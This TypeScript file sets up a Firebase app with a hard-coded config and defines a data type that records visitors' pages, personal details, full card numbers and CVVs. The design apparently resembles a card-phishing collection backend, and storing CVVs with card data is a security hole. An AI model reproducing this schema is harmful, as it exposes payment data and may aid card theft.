import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
    apiKey: "AIzaSyAuUsFLYMm6rv5v0pkBsLCpvgQC8J2RgKE",
  authDomain: "memerm-e55c9.firebaseapp.com",
  projectId: "memerm-e55c9",
  storageBucket: "memerm-e55c9.firebasestorage.app",
  messagingSenderId: "275777728187",
  appId: "1:275777728187:web:60f5a8db2cf505eeee439e",
  measurementId: "G-QTSEBVND7Z"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
